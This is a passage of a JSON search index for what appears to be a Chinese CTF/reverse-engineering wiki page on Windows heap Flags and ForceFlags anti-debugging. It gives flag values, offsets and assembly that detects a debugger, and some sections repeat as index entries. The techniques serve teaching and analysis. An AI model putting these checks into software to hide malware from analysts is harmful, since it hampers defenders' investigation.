(0x10000)\n\u90fd\u4f1a\u88ab\u8bbe\u7f6e. \u5982\u679c\u7248\u672c\u4f4e\u4e8e\n3.10\n, \u90a3\u4e48\u8fd9\u4e2a\u7a0b\u5e8f\u6587\u4ef6\u5c31\u6839\u672c\u4e0d\u4f1a\u88ab\u8fd0\u884c. \n\n\n\u5982\u679c\u67d0\u64cd\u4f5c\u5c06\nFlags\n\u548c\nForgeFlags\n\u5b57\u6bb5\u7684\u503c\u5206\u522b\u8bbe\u4e3a\n2\n\u548c\n0\n, \u4f46\u662f\u5374\u672a\u5bf9\nsubsystem\n\u7248\u672c\u8fdb\u884c\u68c0\u67e5, \u90a3\u4e48\u5c31\u53ef\u4ee5\u8868\u660e\u8be5\u52a8\u4f5c\u662f\u4e3a\u4e86\u9690\u85cf\u8c03\u8bd5\u5668\u800c\u8fdb\u884c\u7684. \n\n\n\u5f53\u8c03\u8bd5\u5668\u5b58\u5728\u65f6, \u5728\nWindows NT\n, \nWindows 2000\n\u548c32\u4f4d\nWindows XP\n\u7cfb\u7edf\u4e0b, \nFlags\n\u5b57\u6bb5\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7:\n\n\nHEAP_GROWABLE\n \n(\n2\n)\n\n\nHEAP_TAIL_CHECKING_ENABLED\n \n(\n0x20\n)\n\n\nHEAP_FREE_CHECKING_ENABLED\n \n(\n0x40\n)\n\n\nHEAP_SKIP_VALIDATION_CHECKS\n \n(\n0x10000000\n)\n\n\nHEAP_VALIDATE_PARAMETERS_ENABLED\n \n(\n0x40000000\n)\n\n\n\n\n\n\u572864\u4f4d\nWindows XP\n\u7cfb\u7edf, \nWindows Vista\n\u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u7248\u672c, \nFlags\n\u5b57\u6bb5\u5219\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7(\u5c11\u4e86\nHEAP_SKIP_VALIDATION_CHECKS (0x10000000)\n):\n\n\nHEAP_GROWABLE\n \n(\n2\n)\n\n\nHEAP_TAIL_CHECKING_ENABLED\n \n(\n0x20\n)\n\n\nHEAP_FREE_CHECKING_ENABLED\n \n(\n0x40\n)\n\n\nHEAP_VALIDATE_PARAMETERS_ENABLED\n \n(\n0x40000000\n)\n\n\n\n\n\n\u800c\u5bf9\u4e8e\nForgeFlags\n\u5b57\u6bb5, \u6b63\u5e38\u60c5\u51b5\u5219\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7:\n\n\nHEAP_TAIL_CHECKING_ENABLED\n \n(\n0x20\n)\n\n\nHEAP_FREE_CHECKING_ENABLED\n \n(\n0x40\n)\n\n\nHEAP_VALIDATE_PARAMETERS_ENABLED\n \n(\n0x40000000\n)\n\n\n\n\n\n\u56e0\u4e3a\nNtGlobalFlag\n\u6807\u5fd7\u7684\u5173\u7cfb, \nheap\n\u4e5f\u4f1a\u8bbe\u7f6e\u4e00\u4e9b\u6807\u5fd7\u4f4d\n\n\n\n\n\u5982\u679c\u5728\nNtGlobalFlag\n\u5b57\u6bb5\u4e2d\u6709\u8bbe\u7f6e\nFLG_HEAP_ENABLE_TAIL_CHECK\n\u6807\u5fd7, \u90a3\u4e48\u5728\nheap\n\u5b57\u6bb5\u4e2d\u5c31\u4f1a\u8bbe\u7f6e\nHEAP_TAIL_CHECKING_ENABLED\n\u6807\u5fd7. \n\n\n\u5982\u679c\u5728\nNtGlobalFlag\n\u5b57\u6bb5\u4e2d\u6709\u8bbe\u7f6e\nFLG_HEAP_ENABLE_FREE_CHECK\n\u6807\u5fd7, \u90a3\u4e48\u5728\nheap\n\u5b57\u6bb5\u4e2d\u5c31\u4f1a\u8bbe\u7f6e\nFLG_HEAP_ENABLE_FREE_CHECK\n\u6807\u5fd7.\n\n\n\u5982\u679c\u5728\nNtGlobalFlag\n\u5b57\u6bb5\u4e2d\u6709\u8bbe\u7f6e\nFLG_HEAP_VALIDATE_PARAMETERS\n\u6807\u5fd7, \u90a3\u4e48\u5728\nheap\n\u5b57\u6bb5\u4e2d\u5c31\u4f1a\u8bbe\u7f6e\nHEAP_VALIDATE_PARAMETERS_ENABLED\n\u6807\u5fd7(\u5728\nWindows NT\n\u548c\nWindows 2000\n\u4e2d\u8fd8\u4f1a\u8bbe\u7f6e\nHEAP_CREATE_ALIGN_16 (0x10000)\n\u6807\u5fd7).\n\n\n\n\nheap flags\n\u540c\u6837\u4e5f\u5982\u4e0a\u8282\u7684\nNtGlobalFlag\n\u90a3\u6837, \u4e0d\u8fc7\u5b83\u53d7\u5230\u6ce8\u518c\u8868\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\nfilename\n\u4f4d\u7f6e\u7684\nPageHeapFlags\n\u952e\u7684\u63a7\u5236. \n\n\n\u83b7\u53d6heap\u4f4d\u7f6e\n\n\n\u6709\u591a\u79cd\u65b9\u6cd5\u80fd\u83b7\u77e5\nheap\n\u7684\u4f4d\u7f6e, \u65b9\u6cd5\u4e4b\u4e00\u5c31\u662f\nkernel32\n\u7684\nGetProcessHeap()\n\u51fd\u6570, \u5f53\u7136\u4e5f\u53ef\u4ee5\u7528\u4ee5\u4e0b\u768432\u4f4d\u6c47\u7f16\u4ee3\u7801\u6765\u68c0\u6d4b32\u4f4d\u73af\u5883(\u5b9e\u9645\u4e0a\u5c31\u6709\u4e00\u4e9b\u58f3\u907f\u514d\u4f7f\u7528\u8be5api\u51fd\u6570, \u76f4\u63a5\u67e5\u8be2PEB):\n\n\nmov\n \neax\n,\n \nfs\n:[\n30\nh\n]\n \n;Process Environment Block\n\n\nmov\n \neax\n,\n \n[\neax\n+\n18\nh\n]\n \n;get process heap base\n\n\n\n\n\n\u6216\u4f7f\u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u6765\u68c0\u6d4b64\u4f4d\u73af\u5883\n\n\npush\n \n60\nh\n\n\npop\n \nrsi\n\n\ngs:\nlodsq\n \n;Process Environment Block\n\n\nmov\n \neax\n,\n \n[\nrax\n+\n30\nh\n]\n \n;get process heap base\n\n\n\n\n\n\u6216\u4f7f\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883\n\n\nmov\n \neax\n,\n \nfs\n:[\n30\nh\n]\n \n;Process Environment Block\n\n\n;64-bit Process Environment Block\n\n\n;follows 32-bit Process Environment Block\n\n\nmov\n \neax\n,\n \n[\neax\n+\n1030\nh\n]\n \n;get process heap base\n\n\n\n\n\n\u53e6\u5916\u4e00\u79cd\u65b9\u6cd5\u5219\u662f\u4f7f\u7528\nkernel32\n\u7684\nGetProcessHeaps()\n\u51fd\u6570, \u5176\u5b9e\u5b83\u53ea\u662f\u7b80\u5355\u7684\u8f6c\u7ed9\u4e86\nntdll\n\u7684\nRtlGetProcessHeaps()\n\u51fd\u6570, \u8fd9\u4e2a\u51fd\u6570\u4f1a\u8fd4\u56de\u5c5e\u4e8e\u5f53\u524d\u8fdb\u7a0b\u7684\u5806\u7684\u6570\u7ec4, \u800c\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5806, \u5c31\u8ddf\nkernel32\n\u7684\nGetProcessHeap()\n\u51fd\u6570\u6240\u8fd4\u56de\u7684\u662f\u4e00\u6837\u7684.\n\n\n\u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dwindows\u73af\u5883\u6765\u5b9e\u73b0:\n\n\npush\n \n30\nh\n\n\npop\n \nesi\n\n\nfs:\nlodsd\n \n;Process Environment Block\n\n\n;get process heaps list base\n\n\nmov\n \nesi\n,\n \n[\nesi\n+\neax\n+\n5\nch\n]\n\n\nlodsd\n\n\n\n\n\n\u540c\u4e0a, \u752864\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883\u7684\u4ee3\u7801\u662f:\n\n\npush\n \n60\nh\n\n\npop\n \nrsi\n\n\ngs:\nlodsq\n \n;Process Environment Block\n\n\n;get process heaps list base\n\n\nmov\n \nesi\n,\n \n[\nrsi\n*\n2\n+\nrax\n+\n20\nh\n]\n\n\nlodsd\n\n\n\n\n\n\u6216\u4f7f\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindow\u73af\u5883:\n\n\nmov\n \neax\n,\n \nfs\n:[\n30\nh\n]\n \n;Process Environment Block\n\n\n;64-bit Process Environment Block\n\n\n;follows 32-bit Process Environment Block\n\n\nmov\n \nesi\n,\n \n[\neax\n+\n10\nf0h\n]\n \n;get process heaps list base\n\n\nlodsd\n\n\n\n\n\n\u68c0\u6d4bFlags\u5b57\u6bb5\n\n\n\u90a3\u4e48\u663e\u7136, \u68c0\u6d4b\u8c03\u8bd5\u5668\u6211\u4eec\u5c31\u53ef\u4ee5\u4ece\u68c0\u6d4b\u90a3\u51e0\u4e2a\nFlags\n\u548c\nForgeFlags\n\u7684\u6807\u5fd7\u4f4d\u5165\u624b. \n\n\n\u5148\u770b\nFlags\n\u5b57\u6bb5\u7684\u68c0\u6d4b\u4ee3\u7801, \u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dwindows\u73af\u5883, \u4e14\nsubsystem\n\u7248\u672c\u5728\n3.10-3.50\n\u4e4b\u95f4:\n\n\ncall\n \nGetVersion\n\n\ncmp\n \nal\n,\n \n6\n\n\ncmc\n\n\nsbb\n \nebx\n,\n \nebx\n\n\nand\n \nebx\n,\n \n34\nh\n\n\nmov\n \neax\n,\n \nfs\n:[\n30\nh\n]\n \n;Process Environment Block\n\n\nmov\n \neax\n,\n \n[\neax\n+\n18\nh\n]\n \n;get process heap base\n\n\nmov\n \neax\n,\n \n[\neax\n+\nebx\n+\n0\nch\n]\n \n;Flags\n\n\n;neither HEAP_CREATE_ALIGN_16\n\n\n;nor HEAP_SKIP_VALIDATION_CHECKS\n\n\nand\n \neax\n,\n \n0\neffeffffh\n\n\n;HEAP_GROWABLE\n\n\n;+ HEAP_TAIL_CHECKING_ENABLED\n\n\n;+ HEAP_FREE_CHECKING_ENABLED\n\n\n;+ HEAP_VALIDATE_PARAMETERS_ENABLED\n\n\ncmp\n \neax\n,\n \n40000062\nh\n\n\nje\n \nbeing_debugged\n\n\n\n\n\n32\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dwindows\u73af\u5883, \u4e14\nsubsystem\n\u4e3a\n3.51\n\u53ca\u66f4\u9ad8\u7248\u672c:\n\n\ncall\n \nGetVersion\n\n\ncmp\n \nal\n,\n \n6\n\n\ncmc\n\n\nsbb\n \nebx\n,\n \nebx\n\n\nand\n \nebx\n,\n \n34\nh\n\n\nmov\n \neax\n,\n \nfs\n:[\n30\nh\n]\n \n;Process Environment Block\n\n\nmov\n \neax\n,\n \n[\neax\n+\n18\nh\n]\n \n;get process heap base\n\n\nmov\n \neax\n,\n \n[\neax\n+\nebx\n+\n0\nch\n]\n \n;Flags\n\n\n;not HEAP_SKIP_VALIDATION_CHECKS\n\n\nbswap\n \neax\n\n\nand\n \nal\n,\n \n0\nefh\n\n\n;HEAP_GROWABLE\n\n\n;+ HEAP_TAIL_CHECKING_ENABLED\n\n\n;+ HEAP_FREE_CHECKING_ENABLED\n\n\n;+ HEAP_VALIDATE_PARAMETERS_ENABLED\n\n\n;reversed by bswap\n\n\ncmp\n \neax\n,\n \n62000040\nh\n\n\nje\n \nbeing_debugged\n\n\n\n\n\n64\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883(64\u4f4d\u8fdb\u7a0b\u4e0d\u5fc5\u53d7\nsubsystem\n\u7248\u672c\u56f0\u6270):\n\n\npush\n \n60\nh\n\n\npop\n \nrsi\n\n\ngs:\nlodsq\n \n;Process Environment Block\n\n\nmov\n \nebx\n,\n \n[\nrax\n+\n30\nh\n]\n \n;get process heap base\n\n\ncall\n \nGetVersion\n\n\ncmp\n \nal\n,\n \n6\n\n\nsbb\n \nrax\n,\n \nrax\n\n\nand\n \nal\n,\n \n0\na4h\n\n\n;HEAP_GROWABLE\n\n\n;+ HEAP_TAIL_CHECKING_ENABLED\n\n\n;+ HEAP_FREE_CHECKING_ENABLED\n\n\n;+ HEAP_VALIDATE_PARAMETERS_ENABLED\n\n\ncmp\n \nd\n \n[\nrbx\n+\nrax\n+\n70\nh\n],\n \n40000062\nh\n \n;Flags\n\n\nje\n \nbeing_debugged\n\n\n\n\n\n\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883:\n\n\npush\n \n30\nh\n\n\npop\n \neax\n\n\nmov\n \nebx\n,\n \nfs\n:[\neax\n]\n \n;Process Environment Block\n\n\n;64-bit Process Environment Block\n\n\n;follows 32-bit Process Environment Block\n\n\nmov\n \nah\n,\n \n10\nh\n\n\nmov\n \nebx\n,\n \n[\nebx\n+\neax\n]\n \n;get process heap base\n\n\ncall\n \nGetVersion\n\n\ncmp\n \nal\n,\n \n6\n\n\nsbb\n \neax\n,\n \neax\n\n\nand\n \nal\n,\n \n0\na4h\n\n\n;Flags\n\n\n;HEAP_GROWABLE\n\n\n;+ HEAP_TAIL_CHECKING_ENABLED\n\n\n;+ HEAP_FREE_CHECKING_ENABLED\n\n\n;+ HEAP_VALIDATE_PARAMETERS_ENABLED\n\n\ncmp\n \n[\nebx\n+\neax\n+\n70\nh\n],\n \n40000062\nh\n\n\nje\n \nbeing_debugged\n\n\n\n\n\n\u5982\u679c\u662f\u76f4\u63a5\u901a\u8fc7\nKUSER_SHARED_DATA\n\u7ed3\u6784\u7684\nNtMajorVersion\n\u5b57\u6bb5(\u4f4d\u4e8e2G\u7528\u6237\u7a7a\u95f4\u7684\n0x7ffe026c\n\u504f\u79fb\u5904)\u83b7\u53d6\u8be5\u503c(\u5728\u6240\u670932\u4f4d/64\u4f4d\u7248\u672c\u7684Windows\u90fd\u53ef\u4ee5\u83b7\u53d6\u8be5\u503c), \u53ef\u4ee5\u8fdb\u4e00\u6b65\u6df7\u6dc6\nkernel32\n\u7684\nGetVersion()\n\u51fd\u6570\u8c03\u7528\u64cd\u4f5c.\n\n\n\u68c0\u6d4bForgeFlags\u5b57\u6bb5\n\n\n\u5f53\u7136\u53e6\u4e00\u4e2a\u65b9\u6cd5\u5c31\u662f\u68c0\u6d4b\nForgeFlags\n\u5b57\u6bb5, \u4ee5\u4e0b\u662f32\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dWindows\u73af\u5883, \nsubsystem\n\u7248\u672c\u5728\n3.10-3.50\n\u4e4b\u95f4:\n\n\ncall\n \nGetVersion\n\n\ncmp\n \nal\n,\n \n6\n\n\ncmc\n\n\nsbb\n \nebx\n,\n \nebx\n\n\nand\n \nebx\n,\n \n34\nh\n\n\nmov\n \neax\n,\n \nfs\n:[\n30\nh\n]\n \n;Process Environment Block\n\n\nmov\n \neax\n,\n \n[\neax\n+\n18\nh\n]\n \n;get process heap base\n\n\nmov\n \neax\n,\n \n[\neax\n+\nebx\n+\n10\nh\n]\n \n;ForceFlags\n\n\n;not HEAP_CREATE_ALIGN_16\n\n\nbtr\n \neax\n,\n \n10\nh\n\n\n;HEAP_TAIL_CHECKING_ENABLED\n\n\n;+ HEAP_FREE_CHECKING_ENABLED\n\n\n;+ HEAP_VALIDATE_PARAMETERS_ENABLED\n\n\ncmp\n \neax\n,\n \n40000060\nh\n\n\nje\n \nbeing_debugged\n\n\n\n\n\n32\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dwindows\u73af\u5883, \u4e14\nsubsystem\n\u4e3a\n3.51\n\u53ca\u66f4\u9ad8\u7248\u672c:\n\n\ncall\n \nGetVersion\n\n\ncmp\n \nal\n,\n \n6\n\n\ncmc\n\n\nsbb\n \nebx\n,\n \nebx\n\n\nand\n \nebx\n,\n \n34\nh\n\n\nmov\n \neax\n,\n \nfs\n:[\n30\nh\n]\n \n;Process Environment Block\n\n\nmov\n \neax\n,\n \n[\neax\n+\n18\nh\n]\n \n;get process heap base\n\n\n;ForceFlags\n\n\n;HEAP_TAIL_CHECKING_ENABLED\n\n\n;+ HEAP_FREE_CHECKING_ENABLED\n\n\n;+ HEAP_VALIDATE_PARAMETERS_ENABLED\n\n\ncmp\n \n[\neax\n+\nebx\n+\n10\nh\n],\n \n40000060\nh\n\n\nje\n \nbeing_debugged\n\n\n\n\n\n64\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883(64\u4f4d\u8fdb\u7a0b\u4e0d\u5fc5\u53d7\nsubsystem\n\u7248\u672c\u56f0\u6270):\n\n\npush\n \n60\nh\n\n\npop\n \nrsi\n\n\ngs:\nlodsq\n \n;Process Environment Block\n\n\nmov\n \nebx\n,\n \n[\nrax\n+\n30\nh\n]\n \n;get process heap base\n\n\ncall\n \nGetVersion\n\n\ncmp\n \nal\n,\n \n6\n\n\nsbb\n \nrax\n,\n \nrax\n\n\nand\n \nal\n,\n \n0\na4h\n\n\n;ForceFlags\n\n\n;HEAP_TAIL_CHECKING_ENABLED\n\n\n;+ HEAP_FREE_CHECKING_ENABLED\n\n\n;+ HEAP_VALIDATE_PARAMETERS_ENABLED\n\n\ncmp\n \nd\n \n[\nrbx\n+\nrax\n+\n74\nh\n],\n \n40000060\nh\n\n\nje\n \nbeing_debugged\n\n\n\n\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883:\n\n\ncall\n \nGetVersion\n\n\ncmp\n \nal\n,\n \n6\n\n\npush\n \n30\nh\n\n\npop\n \neax\n\n\nmov\n \nebx\n,\n \nfs\n:[\neax\n]\n \n;Process Environment Block\n\n\n;64-bit Process Environment Block\n\n\n;follows 32-bit Process Environment Block\n\n\nmov\n \nah\n,\n \n10\nh\n\n\nmov\n \nebx\n,\n \n[\nebx\n+\neax\n]\n \n;get process heap base\n\n\nsbb\n \neax\n,\n \neax\n\n\nand\n \nal\n,\n \n0\na4h\n\n\n;ForceFlags\n\n\n;HEAP_TAIL_CHECKING_ENABLED\n\n\n;+ HEAP_FREE_CHECKING_ENABLED\n\n\n;+ HEAP_VALIDATE_PARAMETERS_ENABLED\n\n\ncmp\n \n[\nebx\n+\neax\n+\n74\nh\n],\n \n40000060\nh\n\n\nje\n \nbeing_debugged\n\n\n\n\n\n\u53c2\u8003\u94fe\u63a5\n\n\n\n\nThe \"Ultimate\" Anti-Debugging Reference", 
            "title": "Heap Flags"
        }, 
        {
            "location": "/reverse/anti-debug/heap-flags/#heap-flags", 
            "text": "Heap flags \u5305\u542b\u6709\u4e24\u4e2a\u4e0e NtGlobalFlag \u4e00\u8d77\u521d\u59cb\u5316\u7684\u6807\u5fd7:  Flags \u548c ForceFlags . \u8fd9\u4e24\u4e2a\u5b57\u6bb5\u7684\u503c\u4e0d\u4ec5\u4f1a\u53d7\u8c03\u8bd5\u5668\u7684\u5f71\u54cd, \u8fd8\u4f1a\u7531windows\u7248\u672c\u800c\u4e0d\u540c, \u5b57\u6bb5\u7684\u4f4d\u7f6e\u4e5f\u53d6\u51b3\u4e8ewindows\u7684\u7248\u672c.    Flags\u5b57\u6bb5:  \u572832\u4f4dWindows NT, Windows 2000\u548cWindows XP\u4e2d,  Flags \u4f4d\u4e8e\u5806\u7684 0x0C \u504f\u79fb\u5904. \u572832\u4f4dWindows Vista\u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u4e2d, \u5b83\u4f4d\u4e8e 0x40 \u504f\u79fb\u5904.   \u572864\u4f4dWindows XP\u4e2d,  Flags \u5b57\u6bb5\u4f4d\u4e8e\u5806\u7684 0x14 \u504f\u79fb\u5904, \u800c\u572864\u4f4dWindows Vista\u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u4e2d, \u5b83\u5219\u662f\u4f4d\u4e8e 0x70 \u504f\u79fb\u5904.    ForceFlags\u5b57\u6bb5:  \u572832\u4f4dWindows NT, Windows 2000\u548cWindows XP\u4e2d,  ForceFlags \u4f4d\u4e8e\u5806\u7684 0x10 \u504f\u79fb\u5904. \u572832\u4f4dWindows Vista\u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u4e2d, \u5b83\u4f4d\u4e8e 0x44 \u504f\u79fb\u5904.   \u572864\u4f4dWindows XP\u4e2d,  ForceFlags \u5b57\u6bb5\u4f4d\u4e8e\u5806\u7684 0x18 \u504f\u79fb\u5904, \u800c\u572864\u4f4dWindows Vista\u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u4e2d, \u5b83\u5219\u662f\u4f4d\u4e8e 0x74 \u504f\u79fb\u5904.     \u5728\u6240\u6709\u7248\u672c\u7684Windows\u4e2d,  Flags \u5b57\u6bb5\u7684\u503c\u6b63\u5e38\u60c5\u51b5\u90fd\u8bbe\u4e3a HEAP_GROWABLE(2) , \u800c ForceFlags \u5b57\u6bb5\u6b63\u5e38\u60c5\u51b5\u90fd\u8bbe\u4e3a 0 . \u7136\u800c\u5bf9\u4e8e\u4e00\u4e2a32\u4f4d\u8fdb\u7a0b(64\u4f4d\u7a0b\u5e8f\u4e0d\u4f1a\u6709\u6b64\u56f0\u6270), \u8fd9\u4e24\u4e2a\u9ed8\u8ba4\u503c, \u90fd\u53d6\u51b3\u4e8e\u5b83\u7684\u5bbf\u4e3b\u8fdb\u7a0b(host process)\u7684 subsystem \u7248\u672c(\u8fd9\u91cc\u4e0d\u662f\u6307\u6240\u8bf4\u7684\u6bd4\u5982win10\u7684linux\u5b50\u7cfb\u7edf). \u53ea\u6709\u5f53 subsystem \u5728 3.51 \u53ca\u66f4\u9ad8\u7684\u7248\u672c, \u5b57\u6bb5\u7684\u9ed8\u8ba4\u503c\u624d\u5982\u524d\u6240\u8ff0. \u5982\u679c\u662f\u5728 3.10-3.50 \u7248\u672c\u4e4b\u95f4, \u5219\u4e24\u4e2a\u5b57\u6bb5\u7684 HEAP_CREATE_ALIGN_16 (0x10000) \u90fd\u4f1a\u88ab\u8bbe\u7f6e. \u5982\u679c\u7248\u672c\u4f4e\u4e8e 3.10 , \u90a3\u4e48\u8fd9\u4e2a\u7a0b\u5e8f\u6587\u4ef6\u5c31\u6839\u672c\u4e0d\u4f1a\u88ab\u8fd0\u884c.   \u5982\u679c\u67d0\u64cd\u4f5c\u5c06 Flags \u548c ForgeFlags \u5b57\u6bb5\u7684\u503c\u5206\u522b\u8bbe\u4e3a 2 \u548c 0 , \u4f46\u662f\u5374\u672a\u5bf9 subsystem \u7248\u672c\u8fdb\u884c\u68c0\u67e5, \u90a3\u4e48\u5c31\u53ef\u4ee5\u8868\u660e\u8be5\u52a8\u4f5c\u662f\u4e3a\u4e86\u9690\u85cf\u8c03\u8bd5\u5668\u800c\u8fdb\u884c\u7684.   \u5f53\u8c03\u8bd5\u5668\u5b58\u5728\u65f6, \u5728 Windows NT ,  Windows 2000 \u548c32\u4f4d Windows XP \u7cfb\u7edf\u4e0b,  Flags \u5b57\u6bb5\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7:  HEAP_GROWABLE   ( 2 )  HEAP_TAIL_CHECKING_ENABLED   ( 0x20 )  HEAP_FREE_CHECKING_ENABLED   ( 0x40 )  HEAP_SKIP_VALIDATION_CHECKS   ( 0x10000000 )  HEAP_VALIDATE_PARAMETERS_ENABLED   ( 0x40000000 )   \u572864\u4f4d Windows XP \u7cfb\u7edf,  Windows Vista \u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u7248\u672c,  Flags \u5b57\u6bb5\u5219\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7(\u5c11\u4e86 HEAP_SKIP_VALIDATION_CHECKS (0x10000000) ):  HEAP_GROWABLE   ( 2 )  HEAP_TAIL_CHECKING_ENABLED   ( 0x20 )  HEAP_FREE_CHECKING_ENABLED   ( 0x40 )  HEAP_VALIDATE_PARAMETERS_ENABLED   ( 0x40000000 )   \u800c\u5bf9\u4e8e ForgeFlags \u5b57\u6bb5, \u6b63\u5e38\u60c5\u51b5\u5219\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7:  HEAP_TAIL_CHECKING_ENABLED   ( 0x20 )  HEAP_FREE_CHECKING_ENABLED   ( 0x40 )  HEAP_VALIDATE_PARAMETERS_ENABLED   ( 0x40000000 )   \u56e0\u4e3a NtGlobalFlag \u6807\u5fd7\u7684\u5173\u7cfb,  heap \u4e5f\u4f1a\u8bbe\u7f6e\u4e00\u4e9b\u6807\u5fd7\u4f4d   \u5982\u679c\u5728 NtGlobalFlag \u5b57\u6bb5\u4e2d\u6709\u8bbe\u7f6e FLG_HEAP_ENABLE_TAIL_CHECK \u6807\u5fd7, \u90a3\u4e48\u5728 heap \u5b57\u6bb5\u4e2d\u5c31\u4f1a\u8bbe\u7f6e HEAP_TAIL_CHECKING_ENABLED \u6807\u5fd7.   \u5982\u679c\u5728 NtGlobalFlag \u5b57\u6bb5\u4e2d\u6709\u8bbe\u7f6e FLG_HEAP_ENABLE_FREE_CHECK \u6807\u5fd7, \u90a3\u4e48\u5728 heap \u5b57\u6bb5\u4e2d\u5c31\u4f1a\u8bbe\u7f6e FLG_HEAP_ENABLE_FREE_CHECK \u6807\u5fd7.  \u5982\u679c\u5728 NtGlobalFlag \u5b57\u6bb5\u4e2d\u6709\u8bbe\u7f6e FLG_HEAP_VALIDATE_PARAMETERS \u6807\u5fd7, \u90a3\u4e48\u5728 heap \u5b57\u6bb5\u4e2d\u5c31\u4f1a\u8bbe\u7f6e HEAP_VALIDATE_PARAMETERS_ENABLED \u6807\u5fd7(\u5728 Windows NT \u548c Windows 2000 \u4e2d\u8fd8\u4f1a\u8bbe\u7f6e HEAP_CREATE_ALIGN_16 (0x10000) \u6807\u5fd7).   heap flags \u540c\u6837\u4e5f\u5982\u4e0a\u8282\u7684 NtGlobalFlag \u90a3\u6837, \u4e0d\u8fc7\u5b83\u53d7\u5230\u6ce8\u518c\u8868 HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ filename \u4f4d\u7f6e\u7684 PageHeapFlags \u952e\u7684\u63a7\u5236.", 
            "title": "\u5173\u4e8eHeap flags"
        }, 
        {
            "location": "/reverse/anti-debug/heap-flags/#heap", 
            "text": "\u6709\u591a\u79cd\u65b9\u6cd5\u80fd\u83b7\u77e5 heap \u7684\u4f4d\u7f6e, \u65b9\u6cd5\u4e4b\u4e00\u5c31\u662f kernel32 \u7684 GetProcessHeap() \u51fd\u6570, \u5f53\u7136\u4e5f\u53ef\u4ee5\u7528\u4ee5\u4e0b\u768432\u4f4d\u6c47\u7f16\u4ee3\u7801\u6765\u68c0\u6d4b32\u4f4d\u73af\u5883(\u5b9e\u9645\u4e0a\u5c31\u6709\u4e00\u4e9b\u58f3\u907f\u514d\u4f7f\u7528\u8be5api\u51fd\u6570, \u76f4\u63a5\u67e5\u8be2PEB):  mov   eax ,   fs :[ 30 h ]   ;Process Environment Block  mov   eax ,   [ eax + 18 h ]   ;get process heap base   \u6216\u4f7f\u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u6765\u68c0\u6d4b64\u4f4d\u73af\u5883  push   60 h  pop   rsi  gs: lodsq   ;Process Environment Block  mov   eax ,   [ rax + 30 h ]   ;get process heap base   \u6216\u4f7f\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883  mov   eax ,   fs :[ 30 h ]   ;Process Environment Block  ;64-bit Process Environment Block  ;follows 32-bit Process Environment Block  mov   eax ,   [ eax + 1030 h ]   ;get process heap base   \u53e6\u5916\u4e00\u79cd\u65b9\u6cd5\u5219\u662f\u4f7f\u7528 kernel32 \u7684 GetProcessHeaps() \u51fd\u6570, \u5176\u5b9e\u5b83\u53ea\u662f\u7b80\u5355\u7684\u8f6c\u7ed9\u4e86 ntdll \u7684 RtlGetProcessHeaps() \u51fd\u6570, \u8fd9\u4e2a\u51fd\u6570\u4f1a\u8fd4\u56de\u5c5e\u4e8e\u5f53\u524d\u8fdb\u7a0b\u7684\u5806\u7684\u6570\u7ec4, \u800c\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5806, \u5c31\u8ddf kernel32 \u7684 GetProcessHeap() \u51fd\u6570\u6240\u8fd4\u56de\u7684\u662f\u4e00\u6837\u7684.  \u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dwindows\u73af\u5883\u6765\u5b9e\u73b0:  push   30 h  pop   esi  fs: lodsd   ;Process Environment Block  ;get process heaps list base  mov   esi ,   [ esi + eax + 5 ch ]  lodsd   \u540c\u4e0a, \u752864\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883\u7684\u4ee3\u7801\u662f:  push   60 h  pop   rsi  gs: lodsq   ;Process Environment Block  ;get process heaps list base  mov   esi ,   [ rsi * 2 + rax + 20 h ]  lodsd   \u6216\u4f7f\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindow\u73af\u5883:  mov   eax ,   fs :[ 30 h ]   ;Process Environment Block  ;64-bit Process Environment Block  ;follows 32-bit Process Environment Block  mov   esi ,   [ eax + 10 f0h ]   ;get process heaps list base  lodsd", 
            "title": "\u83b7\u53d6heap\u4f4d\u7f6e"
        }, 
        {
            "location": "/reverse/anti-debug/heap-flags/#flags", 
